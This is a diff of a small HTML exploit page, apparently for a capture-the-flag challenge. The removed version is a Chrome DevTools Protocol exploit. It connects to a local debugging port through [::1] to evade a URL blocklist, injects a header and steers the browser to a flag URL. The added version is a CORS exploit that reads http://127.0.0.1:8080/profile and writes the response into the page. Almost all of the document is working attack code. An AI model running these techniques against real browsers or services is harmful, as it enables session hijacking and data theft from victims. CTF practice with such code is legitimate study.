@@ -1,77 +1,31 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-    <title>CTF Exploit</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>CORS Exploit</title>
 </head>
+
 <body>
-    <h2>Chrome CDP Exploit</h2>
-    <p>1. Target Port: <input type="text" id="port" value="9222"></p>
-    <p>2. Target UUID: <input type="text" id="uuid" placeholder="Paste UUID here"></p>
-    <button onclick="runExploit()">PWN</button>
-    <div id="log"></div>
+    <center>
+        <button type='button' onclick='exploit()'>Exploit</button>
+        <p id='demo'></p>
+    </center>
 
     <script>
-        function log(msg) {
-            document.getElementById('log').innerHTML += msg + "<br>";
-        }
+        function handleResponse() {
+      document.write(this.responseText);
+    }
 
-        function runExploit() {
-            const port = document.getElementById('port').value;
-            const uuid = document.getElementById('uuid').value;
-            
-            // Bypass: Use [::1] to evade URLBlocklist ("127.0.0.1") 
-            // and satisfy Host Header check (must be IP).
-            const wsUrl = `ws://[::1]:${port}/devtools/page/${uuid}`;
-            
-            log(`Connecting to ${wsUrl}...`);
-
-            try {
-                const ws = new WebSocket(wsUrl);
-
-                ws.onopen = function() {
-                    log("WebSocket Connected!");
-
-                    // Step 1: Enable Network domain
-                    ws.send(JSON.stringify({
-                        id: 1,
-                        method: "Network.enable"
-                    }));
-
-                    // Step 2: Set the custom header required for the flag
-                    ws.send(JSON.stringify({
-                        id: 2,
-                        method: "Network.setExtraHTTPHeaders",
-                        params: {
-                            headers: {
-                                "ctfheader": "true"
-                            }
-                        }
-                    }));
-
-                    // Step 3: Navigate the attached tab to the flag URL
-                    ws.send(JSON.stringify({
-                        id: 3,
-                        method: "Page.navigate",
-                        params: {
-                            url: "http://ctflocal.server/flag"
-                        }
-                    }));
-                    
-                    log("Payload sent. Check the browser tab!");
-                };
-
-                ws.onmessage = function(event) {
-                    console.log("RX: " + event.data);
-                };
-
-                ws.onerror = function(err) {
-                    log("WebSocket Error. Ensure [::1] is allowed and port is correct.");
-                };
-
-            } catch (e) {
-                log("Error: " + e.message);
-            }
-        }
+    function exploit() {
+      var request = new XMLHttpRequest();
+      request.addEventListener("load", handleResponse);
+      request.open("GET", "http://127.0.0.1:8080/profile");
+      request.send();
+    }
     </script>
+
 </body>
+
 </html>
